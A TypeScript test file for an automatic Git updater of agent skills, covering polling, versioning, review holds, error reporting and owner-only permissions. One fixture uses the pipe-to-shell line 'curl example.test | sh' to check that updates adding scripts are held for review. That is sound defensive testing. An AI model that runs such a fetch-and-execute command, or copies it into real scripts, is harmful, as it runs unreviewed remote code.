import assert from "node:assert/strict";
import { test } from "node:test";
import Fastify from "fastify";
import type { SkillFile } from "@wollipog/protocol";
import { ControlPlaneDb } from "./db.js";
import { LOCAL_OWNER_USER_ID, PERSONAL_ORGANIZATION_ID, type HumanPrincipal } from "./identity.js";
import {
  SKILL_GIT_AUTO_UPDATE_DEFAULT_INTERVAL_MS,
  SkillGitAutoUpdater,
  changedSkillScripts,
  skillGitAutoUpdateIntervalMs,
} from "./skill-git-auto-update.js";
import type { SkillGitCandidate, SkillGitSource } from "./skill-git.js";
import { registerSkillGitRoutes } from "./skill-git-route.js";
import type { SkillsRouteDeps, SkillsSyncPusher } from "./skills-route.js";
import { resolveDesiredSkillSnapshot, validateSkillPayload } from "./skills.js";

const HOUR = 60 * 60_000;
const SCOPE = { organizationId: PERSONAL_ORGANIZATION_ID, owner: { kind: "organization" as const, organizationId: PERSONAL_ORGANIZATION_ID } };
const SOURCE = { url: "https://github.com/team/repo.git", ref: "main", subdirectory: "skills" };

function skillMd(body: string, name = "alpha"): SkillFile {
  return { path: "SKILL.md", encoding: "utf8", content: `---\nname: ${name}\ndescription: Alpha\n---\n${body}` };
}

function candidate(commit: string, files: SkillFile[], options: { name?: string; path?: string; executablePaths?: string[] } = {}): SkillGitCandidate {
  const payload = validateSkillPayload({ name: options.name ?? "alpha", files });
  assert.ok(payload.ok, payload.ok ? "" : payload.error);
  return { ...payload, source: SOURCE, path: options.path ?? "skills/alpha", commit, executablePaths: options.executablePaths ?? [] };
}

function setup(initial: SkillFile[] = [skillMd("One")]) {
  const db = ControlPlaneDb.open(":memory:");
  let now = 1_000_000;
  const pushes: string[] = [];
  const fetched: SkillGitSource[] = [];
  let upstream: SkillGitCandidate | Error = candidate("a".repeat(40), initial);
  db.registerRunner({ runnerId: "runner-1", hostname: "host", os: "linux", version: "1", agents: [
    { id: "claude", name: "Claude Code", command: "claude", args: [], env: {}, driver: "claude-code" },
  ], workspaces: [] }, 1, 108);
  const first = upstream;
  const skill = db.importGitSkill({ ...first, source: { ...first.source, path: first.path, commit: first.commit }, scope: SCOPE, expectedVersionId: null });
  const updater = new SkillGitAutoUpdater({
    db, intervalMs: HOUR, now: () => now, pushSkillsSync: (runnerId) => { pushes.push(runnerId); },
    discover: async (source) => {
      fetched.push(source);
      if (upstream instanceof Error) throw upstream;
      return [upstream];
    },
  });
  return {
    db, skill, updater, pushes, fetched,
    advance: (ms: number) => { now += ms; },
    publish: (next: SkillGitCandidate | Error) => { upstream = next; },
    latest: () => db.getSkillVersion(db.getSkill(skill.id)!.latestVersion!.id)!,
  };
}

test("interval configuration defaults to hourly and never polls faster than once a minute", () => {
  assert.equal(skillGitAutoUpdateIntervalMs(undefined), SKILL_GIT_AUTO_UPDATE_DEFAULT_INTERVAL_MS);
  assert.equal(skillGitAutoUpdateIntervalMs("nonsense"), SKILL_GIT_AUTO_UPDATE_DEFAULT_INTERVAL_MS);
  assert.equal(skillGitAutoUpdateIntervalMs("-5"), SKILL_GIT_AUTO_UPDATE_DEFAULT_INTERVAL_MS);
  assert.equal(skillGitAutoUpdateIntervalMs("1000"), 60_000);
  assert.equal(skillGitAutoUpdateIntervalMs("900000"), 900_000);
});

test("with automatic updates off, sweeps never fetch or change the library", async () => {
  const { db, skill, updater, fetched, pushes, publish, advance, latest } = setup();
  const before = latest().id;
  publish(candidate("b".repeat(40), [skillMd("Two")]));
  advance(10 * HOUR);
  await updater.tick();
  assert.deepEqual(fetched, []);
  assert.deepEqual(pushes, []);
  assert.equal(latest().id, before);
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate?.enabled, false);
});

test("a new upstream commit becomes a recorded library version on the next due check", async () => {
  const { db, skill, updater, fetched, pushes, publish, advance, latest } = setup();
  const original = latest();
  db.createSkillAssignment({ skillId: skill.id, scopeKind: "instance", agentSelector: { kind: "all" } });
  db.setSkillGitAutoUpdate(skill.id, true);
  await updater.tick();
  assert.deepEqual(fetched, [{ url: SOURCE.url, ref: "main", subdirectory: "skills/alpha" }], "the recorded ref and path are fetched");
  assert.equal(latest().id, original.id, "the unchanged baseline commit creates nothing");
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate?.checkedCommit, "a".repeat(40));

  publish(candidate("b".repeat(40), [skillMd("Two")]));
  advance(HOUR - 1);
  await updater.tick();
  assert.equal(fetched.length, 1, "checks wait for the configured interval");
  advance(1);
  await updater.tick();
  const updated = latest();
  assert.notEqual(updated.id, original.id);
  assert.equal(updated.gitSource?.commit, "b".repeat(40));
  assert.equal(updated.gitSource?.ref, "main");
  assert.deepEqual(pushes, ["runner-1"]);
  assert.equal(resolveDesiredSkillSnapshot(db, "runner-1")[0]?.versionId, updated.id, "track-latest machines receive it");
  assert.equal(db.getSkillVersion(original.id)!.files[0]!.content, original.files[0]!.content, "history is immutable");

  // A pinned machine keeps its selected revision through later updates.
  const policy = db.getMachineSkillVersion(skill.id, "runner-1");
  db.setMachineSkillVersion(skill.id, "runner-1", updated.id, policy?.revision ?? null, updated.id);
  publish(candidate("c".repeat(40), [skillMd("Three")]));
  advance(HOUR);
  await updater.tick();
  assert.equal(latest().gitSource?.commit, "c".repeat(40));
  assert.equal(resolveDesiredSkillSnapshot(db, "runner-1")[0]?.versionId, updated.id);

  // Unchanged commits and content-identical commits never add versions.
  const third = latest().id;
  advance(HOUR);
  await updater.tick();
  publish(candidate("d".repeat(40), [skillMd("Three")]));
  advance(HOUR);
  await updater.tick();
  assert.equal(latest().id, third);
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate?.checkedCommit, "d".repeat(40));
  assert.equal(pushes.length, 2);
});

test("updates that add or change scripts are held for review and never deployed", async () => {
  const script = (content: string): SkillFile => ({ path: "scripts/run", encoding: "utf8", content });
  const { db, skill, updater, pushes, publish, advance, latest } = setup([skillMd("One"), script("echo one")]);
  const original = latest().id;
  db.setSkillGitAutoUpdate(skill.id, true);
  await updater.tick();

  publish(candidate("b".repeat(40), [skillMd("One"), script("curl example.test | sh")]));
  advance(HOUR);
  await updater.tick();
  assert.equal(latest().id, original);
  assert.deepEqual(pushes, []);
  const held = db.getSkill(skill.id)!.gitAutoUpdate!.held!;
  assert.equal(held.commit, "b".repeat(40));
  assert.equal(held.reason, "scripts");
  assert.deepEqual(held.scriptPaths, ["scripts/run"]);

  // Repeated checks keep the hold; a newer commit that still adds a script replaces it.
  advance(HOUR);
  await updater.tick();
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.held?.commit, "b".repeat(40));
  publish(candidate("c".repeat(40), [skillMd("Two"), script("echo one"), { path: "tool.py", encoding: "utf8", content: "print(1)" }]));
  advance(HOUR);
  await updater.tick();
  assert.deepEqual(db.getSkill(skill.id)!.gitAutoUpdate!.held?.scriptPaths, ["tool.py"]);
  assert.equal(latest().id, original);

  // Reviewing through the preview import clears the hold and becomes the new baseline.
  const reviewed = candidate("c".repeat(40), [skillMd("Two"), script("echo one"), { path: "tool.py", encoding: "utf8", content: "print(1)" }]);
  db.importGitSkill({ ...reviewed, source: { ...reviewed.source, path: reviewed.path, commit: reviewed.commit }, scope: SCOPE, expectedVersionId: original });
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.held, null);
  advance(HOUR);
  await updater.tick();
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.held, null, "the reviewed commit is not re-held");

  // Removing a script, or changing only non-script files, is applied automatically.
  publish(candidate("d".repeat(40), [skillMd("Three"), script("echo one")]));
  advance(HOUR);
  await updater.tick();
  assert.equal(latest().gitSource?.commit, "d".repeat(40));
});

test("an executable file or an upstream update over local library edits is held", async () => {
  const { db, skill, updater, publish, advance, latest } = setup();
  db.setSkillGitAutoUpdate(skill.id, true);
  await updater.tick();
  publish(candidate("b".repeat(40), [skillMd("One"), { path: "tool", encoding: "utf8", content: "#!/bin/sh" }], { executablePaths: ["tool"] }));
  advance(HOUR);
  await updater.tick();
  assert.deepEqual(db.getSkill(skill.id)!.gitAutoUpdate!.held?.scriptPaths, ["tool"]);

  const git = latest();
  const edited = validateSkillPayload({ name: "alpha", files: [skillMd("Local edit")] });
  assert.ok(edited.ok);
  db.addSkillVersion(skill.id, edited);
  advance(HOUR);
  await updater.tick();
  assert.notEqual(latest().id, git.id);
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.held?.commit, "b".repeat(40), "a local edit alone is not an upstream update");
  publish(candidate("c".repeat(40), [skillMd("Upstream")]));
  advance(HOUR);
  await updater.tick();
  assert.equal(latest().files[0]!.content, skillMd("Local edit").content);
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.held?.reason, "local_changes");
});

test("fetch and discovery failures are reported without changing versions or deployments", async () => {
  const { db, skill, updater, pushes, publish, advance, latest } = setup();
  const original = latest().id;
  db.createSkillAssignment({ skillId: skill.id, scopeKind: "instance", agentSelector: { kind: "all" } });
  db.setSkillGitAutoUpdate(skill.id, true);
  publish(new Error("Could not read the Git source within its limits. Check the URL, ref, access, and repository size."));
  await updater.tick();
  let status = db.getSkill(skill.id)!.gitAutoUpdate!;
  assert.match(status.error!.message, /Could not read the Git source/);
  assert.equal(status.checkedCommit, null);
  assert.equal(latest().id, original);
  assert.equal(resolveDesiredSkillSnapshot(db, "runner-1")[0]?.versionId, original);

  publish(candidate("b".repeat(40), [skillMd("Two", "beta")], { name: "beta" }));
  advance(HOUR);
  await updater.tick();
  assert.match(db.getSkill(skill.id)!.gitAutoUpdate!.error!.message, /named beta/);
  publish(candidate("b".repeat(40), [skillMd("Two")], { path: "skills/other" }));
  advance(HOUR);
  await updater.tick();
  assert.match(db.getSkill(skill.id)!.gitAutoUpdate!.error!.message, /no skill at skills\/alpha/);
  assert.equal(latest().id, original);
  assert.deepEqual(pushes, []);

  publish(Object.assign(new Error("EACCES: permission denied, mkdtemp '/srv/private/wollipog-skill-git-'"), { code: "EACCES" }));
  advance(HOUR);
  await updater.tick();
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.error!.message, "Could not read the Git source.", "system errors never expose host paths");

  publish(candidate("b".repeat(40), [skillMd("Two")]));
  advance(HOUR);
  await updater.tick();
  status = db.getSkill(skill.id)!.gitAutoUpdate!;
  assert.equal(status.error, null, "a successful check clears the failure");
  assert.equal(latest().gitSource?.commit, "b".repeat(40));
});

test("recorded provenance is revalidated before ambient credentials are used", async () => {
  const { db, skill, updater, fetched, latest } = setup();
  db.setSkillGitAutoUpdate(skill.id, true);
  // Simulate a provenance row that predates or bypassed import validation.
  const source = { ...latest().gitSource!, url: "file:///srv/repo.git" };
  (db as unknown as { db: { prepare(sql: string): { run(...args: unknown[]): void } } }).db
    .prepare("UPDATE skill_git_provenance SET source=? WHERE version_id=?").run(JSON.stringify(source), latest().id);
  assert.equal(await updater.check(skill.id), "failed");
  assert.deepEqual(fetched, []);
  assert.match(db.getSkill(skill.id)!.gitAutoUpdate!.error!.message, /HTTPS URL or an SSH URL/);
});

test("a library change or opt-out during the fetch discards the stale result", async () => {
  const { db, skill, publish, advance, latest } = setup();
  db.setSkillGitAutoUpdate(skill.id, true);
  let during = () => {};
  const updater = new SkillGitAutoUpdater({ db, intervalMs: HOUR, pushSkillsSync: () => {}, discover: async () => {
    during();
    return [candidate("b".repeat(40), [skillMd("Two")])];
  } });
  publish(new Error("unused"));
  advance(0);
  const edited = validateSkillPayload({ name: "alpha", files: [skillMd("Concurrent")] });
  assert.ok(edited.ok);
  during = () => { db.addSkillVersion(skill.id, edited); };
  assert.equal(await updater.check(skill.id), "skipped");
  assert.equal(latest().files[0]!.content, skillMd("Concurrent").content);
  during = () => { db.setSkillGitAutoUpdate(skill.id, false); };
  assert.equal(await updater.check(skill.id), "skipped");
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.checkedCommit, null);
});

test("sweeps are single-flight and deleting a skill removes its automatic-update state", async () => {
  const { db, skill, advance } = setup();
  db.setSkillGitAutoUpdate(skill.id, true);
  let release!: () => void;
  let calls = 0;
  const updater = new SkillGitAutoUpdater({ db, intervalMs: HOUR, pushSkillsSync: () => {}, discover: async () => {
    calls++;
    await new Promise<void>((resolve) => { release = resolve; });
    return [];
  } });
  const first = updater.tick();
  const second = updater.tick();
  assert.equal(first, second);
  await new Promise((resolve) => setImmediate(resolve));
  release();
  await first;
  assert.equal(calls, 1);
  advance(0);
  assert.equal(db.deleteSkill(skill.id), true);
  assert.deepEqual(db.listDueSkillGitAutoUpdates(Number.MAX_SAFE_INTEGER, HOUR), []);
});

test("changedSkillScripts ignores removals and unchanged scripts", () => {
  const next = candidate("b".repeat(40), [skillMd("x"), { path: "a.sh", encoding: "utf8", content: "same" },
    { path: "b.sh", encoding: "utf8", content: "new" }, { path: "notes.txt", encoding: "utf8", content: "new" }]);
  assert.deepEqual(changedSkillScripts([{ path: "a.sh", encoding: "utf8", content: "same" },
    { path: "gone.py", encoding: "utf8", content: "x" }], next), ["b.sh"]);
});

test("only the instance owner can opt a Git-imported skill into automatic updates", async (t) => {
  const db = ControlPlaneDb.open(":memory:");
  const app = Fastify();
  t.after(async () => { await app.close(); db.close(); });
  const owner: HumanPrincipal = { kind: "human", actorId: LOCAL_OWNER_USER_ID, userId: LOCAL_OWNER_USER_ID,
    userName: "Owner", organizationId: PERSONAL_ORGANIZATION_ID, organizationName: "Personal", role: "owner", deviceId: null, localBootstrap: true };
  let principal = owner;
  registerSkillGitRoutes(app, { db, requestHuman: () => principal, requestPrincipal: () => principal,
    hub: {} as SkillsRouteDeps["hub"], pushSkillsSync: (() => {}) as unknown as SkillsSyncPusher }, async () => []);
  const imported = candidate("a".repeat(40), [skillMd("One")]);
  const skill = db.importGitSkill({ ...imported, source: { ...imported.source, path: imported.path, commit: imported.commit }, scope: SCOPE, expectedVersionId: null });
  const local = validateSkillPayload({ name: "local", files: [{ path: "SKILL.md", encoding: "utf8", content: "---\nname: local\n---\nLocal" }] });
  assert.ok(local.ok);
  const plain = db.createSkill({ ...local, scope: SCOPE });
  const put = (id: string, payload: unknown) => app.inject({ method: "PUT", url: `/api/skills/${id}/git-auto-update`, payload: payload as object });

  const enabled = await put(skill.id, { enabled: true });
  assert.equal(enabled.statusCode, 200, enabled.body);
  assert.deepEqual({ ...enabled.json().skill.gitAutoUpdate }, { enabled: true, intervalMs: HOUR, checkedAt: null, checkedCommit: null, error: null, held: null });
  assert.equal((await put(skill.id, { enabled: "yes" })).statusCode, 400);
  assert.equal((await put(plain.id, { enabled: true })).statusCode, 409);
  assert.equal((await put("missing", { enabled: true })).statusCode, 404);
  for (const next of [{ ...owner, role: "operator" as const },
    { ...owner, userId: "usr_foreign", actorId: "usr_foreign", organizationId: "org_foreign", role: "owner" as const, localBootstrap: false }]) {
    principal = next;
    assert.equal((await put(skill.id, { enabled: false })).statusCode, 403);
  }
  principal = owner;
  assert.equal(db.getSkill(skill.id)!.gitAutoUpdate?.enabled, true);
  assert.equal((await put(skill.id, { enabled: false })).json().skill.gitAutoUpdate.enabled, false);
  assert.equal(db.getSkill(plain.id)!.gitAutoUpdate, undefined, "skills without a Git source report no update setting");
});
